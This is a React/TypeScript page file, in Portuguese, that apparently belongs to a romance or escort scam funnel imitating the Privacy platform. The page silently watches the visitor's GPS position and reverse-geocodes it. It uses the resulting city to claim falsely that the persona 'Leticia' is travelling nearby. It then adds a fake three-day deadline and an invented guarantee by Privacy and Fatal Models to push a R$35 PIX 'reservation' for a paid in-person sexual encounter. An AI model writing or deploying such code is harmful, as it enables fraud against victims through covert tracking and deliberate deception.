import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { useEffect, useMemo, useState } from "react";
import { CheckCircle2, MessageCircle, Phone, ShieldCheck, Plane } from "lucide-react";
import profileAsset from "@/assets/profile.png.asset.json";

import { useServerFn } from "@tanstack/react-start";
import { createPixPayment } from "@/lib/pix.functions";
import { PixPaymentBlock } from "@/components/PixPaymentBlock";

export const Route = createFileRoute("/obrigado2")({
  head: () => ({
    meta: [
      { title: "Obrigada, amor! — @lettvargas" },
      { name: "description", content: "Sua chamada está confirmada. Me deixa seu WhatsApp pra combinarmos." },
    ],
  }),
  component: Obrigado2Page,
});

const ACCENT = "#e85d3a";
const UPSELL3_PRICE = "R$ 35,00";
const UPSELL3_AMOUNT = 35.0;

function formatPhone(v: string) {
  const d = v.replace(/\D/g, "").slice(0, 11);
  if (d.length <= 2) return d;
  if (d.length <= 7) return `(${d.slice(0, 2)}) ${d.slice(2)}`;
  if (d.length <= 10) return `(${d.slice(0, 2)}) ${d.slice(2, 6)}-${d.slice(6)}`;
  return `(${d.slice(0, 2)}) ${d.slice(2, 7)}-${d.slice(7)}`;
}

function Obrigado2Page() {
  const createPix = useServerFn(createPixPayment);
  const navigate = useNavigate();
  const [phone, setPhone] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const [city, setCity] = useState<string | null>(null);

  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [pixCode, setPixCode] = useState<string | null>(null);
  const [pixQr, setPixQr] = useState<string | null>(null);
  const [copied, setCopied] = useState(false);
  const [declined, setDeclined] = useState(false);
  const [pixStartedAt, setPixStartedAt] = useState<number | null>(null);

  // GPS — detecta a cidade silenciosamente para usar no texto do upsell
  useEffect(() => {
    if (typeof window === "undefined" || !navigator.geolocation) return;
    const watchId = navigator.geolocation.watchPosition(
      async (pos) => {
        try {
          const { latitude, longitude } = pos.coords;
          const r = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=pt-BR`,
          );
          const j = await r.json();
          const a = j?.address ?? {};
          const name =
            a.city || a.town || a.village || a.municipality || a.county || a.state || null;
          if (name) setCity(name);
        } catch {}
      },
      () => {},
      { enableHighAccuracy: true, maximumAge: 60000, timeout: 15000 },
    );
    return () => navigator.geolocation.clearWatch(watchId);
  }, []);

  // Data limite: 3 dias a partir de hoje
  const deadline = useMemo(() => {
    const d = new Date();
    d.setDate(d.getDate() + 3);
    return d.toLocaleDateString("pt-BR", {
      day: "2-digit",
      month: "long",
      weekday: "long",
    });
  }, []);

  function handleSubmitPhone(e: React.FormEvent) {
    e.preventDefault();
    const digits = phone.replace(/\D/g, "");
    if (digits.length < 10) {
      setError("Digite um número válido com DDD");
      return;
    }
    setError(null);
    setSubmitted(true);
    setTimeout(() => window.scrollTo({ top: document.body.scrollHeight, behavior: "smooth" }), 200);
  }

  async function handleUpsell3() {
    setLoading(true);
    setError(null);
    try {
      const res = await createPix({
        data: {
          amount: UPSELL3_AMOUNT,
          description: "Atendimento presencial com Leticia",
          customerEmail: "cliente@privacy.com",
          customerName: "Cliente",
        },
      });
      setPixCode(res.pixCopyPaste ?? null);
      setPixQr(res.qrCodeBase64 ?? null);
      setPixStartedAt(Date.now());
    } catch (e) {
      setError(e instanceof Error ? e.message : "Erro ao gerar PIX");
    } finally {
      setLoading(false);
    }
  }

  async function copyCode() {
    if (!pixCode) return;
    try {
      await navigator.clipboard.writeText(pixCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch {}
  }

  return (
    <div className="min-h-screen bg-white text-zinc-900">
      <div className="mx-auto max-w-md px-5 py-8">
        <header className="flex items-center justify-center pb-6">
          <span className="text-2xl font-semibold tracking-tight lowercase">privacy.</span>
        </header>

        {/* Profile + agradecimento */}
        <div className="flex flex-col items-center text-center">
          <div className="relative">
            <img
              src={profileAsset.url}
              alt="leticia"
              className="w-44 h-44 rounded-full object-cover border-4 shadow-[0_8px_30px_rgba(232,93,58,0.25)]"
              style={{ borderColor: ACCENT }}
            />
            <div
              className="absolute -bottom-2 -right-2 rounded-full p-1.5 border-4 border-white"
              style={{ background: ACCENT }}
            >
              <CheckCircle2 className="w-6 h-6 text-white" />
            </div>
          </div>

          <h1 className="mt-6 text-2xl font-bold leading-tight text-zinc-900">
            Obrigada, meu amor! 💖
          </h1>
          <p className="mt-3 text-sm leading-relaxed text-zinc-600">
            Sua assinatura e a <strong className="text-zinc-900">chamada de vídeo</strong> foram
            confirmadas com sucesso. Você é{" "}
            <strong className="text-zinc-900">incrível</strong>, sabia?
          </p>
          <p className="mt-2 text-sm leading-relaxed text-zinc-600">
            Vou te deixar <strong className="text-zinc-900">louco por mim</strong> — te garanto
            que você não vai se arrepender de um único segundo comigo 😈🔥
          </p>
        </div>

        {/* Formulário WhatsApp */}
        {!submitted ? (
          <form
            onSubmit={handleSubmitPhone}
            className="mt-8 rounded-3xl border p-5 shadow-[0_10px_40px_rgba(232,93,58,0.18)]"
            style={{
              borderColor: `${ACCENT}55`,
              background: "linear-gradient(160deg, #fff7f3 0%, #ffffff 60%)",
            }}
          >
            <div
              className="flex items-center gap-2 text-xs font-bold uppercase tracking-wider"
              style={{ color: ACCENT }}
            >
              <MessageCircle className="w-4 h-4" />
              Último passo
            </div>

            <h2 className="mt-3 text-xl font-bold leading-snug text-zinc-900">
              Me passa seu WhatsApp 📲
            </h2>
            <p className="mt-2 text-sm text-zinc-600">
              Vou entrar em contato com você pelo <strong>WhatsApp</strong> pra combinarmos o
              dia e horário da nossa chamada de vídeo.
            </p>

            <label className="mt-4 block">
              <span className="text-xs font-semibold text-zinc-700">WhatsApp com DDD</span>
              <div className="mt-1 flex items-center gap-2 rounded-xl border border-zinc-300 bg-white px-3 py-3 focus-within:border-[#e85d3a]">
                <Phone className="w-4 h-4 text-zinc-400" />
                <input
                  type="tel"
                  inputMode="numeric"
                  placeholder="(11) 91234-5678"
                  value={phone}
                  onChange={(e) => setPhone(formatPhone(e.target.value))}
                  className="w-full bg-transparent text-base outline-none placeholder:text-zinc-400"
                />
              </div>
            </label>

            {error && <p className="mt-3 text-sm text-red-500">{error}</p>}

            <button
              type="submit"
              className="mt-5 w-full rounded-full py-4 text-base font-semibold text-white shadow-lg transition-transform active:scale-[0.98]"
              style={{ background: "linear-gradient(135deg, #f7931e 0%, #e85d3a 100%)" }}
            >
              ENVIAR MEU WHATSAPP
            </button>

            <p className="mt-3 flex items-center justify-center gap-1 text-[11px] text-zinc-500">
              <ShieldCheck className="w-3 h-3" /> Conexão 100% segura e discreta
            </p>
          </form>
        ) : (
          <div className="mt-8 animate-fade-in">
            <div className="rounded-2xl border border-green-200 bg-green-50 p-4 text-sm text-green-800 text-center">
              ✅ Recebi seu WhatsApp! Em breve te chamo por lá, amor.
            </div>

            {/* Terceiro upsell — presencial */}
            <div
              className="mt-6 rounded-3xl border p-5 shadow-[0_10px_40px_rgba(232,93,58,0.18)]"
              style={{
                borderColor: `${ACCENT}55`,
                background: "linear-gradient(160deg, #fff7f3 0%, #ffffff 60%)",
              }}
            >
              <div
                className="flex items-center gap-2 text-xs font-bold uppercase tracking-wider"
                style={{ color: ACCENT }}
              >
                <Plane className="w-4 h-4" />
                Adivinha? Estou de viagem 😏
              </div>

              <h2 className="mt-3 text-xl font-bold leading-snug text-zinc-900">
                Olha que coincidência, amor… tô de viagem{" "}
                {city ? (
                  <>
                    e estou pertinho de você, em{" "}
                    <span style={{ color: ACCENT }}>{city}</span> ✈️
                  </>
                ) : (
                  <>e estou bem pertinho de você ✈️</>
                )}
              </h2>
              <p className="mt-3 text-sm leading-relaxed text-zinc-600">
                Que sorte a nossa 😍 Já que você fechou o conteúdo <em>e</em> a chamada de
                vídeo, agora a gente pode subir o nível de verdade e marcar um{" "}
                <strong className="text-zinc-900">encontro presencial</strong>
                {city ? <> aí mesmo em <strong className="text-zinc-900">{city}</strong></> : null}.
                Tenho certeza que você sempre quis uma{" "}
                <strong className="text-zinc-900">aluna atrevidinha</strong> igual a mim — e
                eu adoraria que você{" "}
                <strong className="text-zinc-900">me ensinasse muitas coisas pessoalmente</strong>{" "}
                🔥
              </p>
              <p className="mt-3 text-sm leading-relaxed text-zinc-600">
                Só que tem um detalhe: fico só mais{" "}
                <strong className="text-zinc-900">3 dias</strong> por aqui (até{" "}
                <strong className="text-zinc-900">{deadline}</strong>), então peço a{" "}
                <strong className="text-zinc-900">reserva antecipada</strong> pra evitar
                engraçadinhos — não gosto e não perco meu tempo com quem não leva a sério.
                Nosso encontro é{" "}
                <strong className="text-zinc-900">totalmente assegurado pela Privacy e pela Fatal Models</strong>,
                então você fica 100% tranquilo, viu? 💖
              </p>
              <p className="mt-3 text-sm leading-relaxed text-zinc-600">
                A <strong className="text-zinc-900">reserva do encontro</strong> é de apenas{" "}
                <strong className="text-zinc-900">{UPSELL3_PRICE}</strong>, e{" "}
                <strong className="text-zinc-900">1 hora de prazer</strong> sai por mais{" "}
                <strong className="text-zinc-900">R$ 100,00</strong> — esse valor você paga{" "}
                <strong className="text-zinc-900">só na hora do nosso encontro</strong>, beleza?
                Preço especial só pra quem já é meu assinante 😘
              </p>

              {!pixCode && !declined && (
                <button
                  onClick={handleUpsell3}
                  disabled={loading}
                  className="mt-5 w-full rounded-full py-4 text-base font-semibold text-white shadow-lg transition-transform active:scale-[0.98] disabled:opacity-60"
                  style={{ background: "linear-gradient(135deg, #f7931e 0%, #e85d3a 100%)" }}
                >
                  {loading ? "Gerando PIX..." : "GARANTIR MINHA RESERVA AGORA"}
                </button>
              )}

              {!pixCode && !declined && (
                <button
                  onClick={() => navigate({ to: "/final" })}
                  className="mt-3 w-full rounded-full py-3 text-sm font-medium text-zinc-500 hover:text-zinc-700"
                >
                  Agora não, obrigado
                </button>
              )}

              {declined && (
                <p className="mt-4 text-center text-sm text-zinc-500">
                  Tudo bem, amor! Te chamo no WhatsApp pra marcarmos a chamada. 💖
                </p>
              )}

              {error && <p className="mt-3 text-sm text-red-500">{error}</p>}

              {pixCode && pixStartedAt && (
                <PixPaymentBlock code={pixCode} startedAt={pixStartedAt} />
              )}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}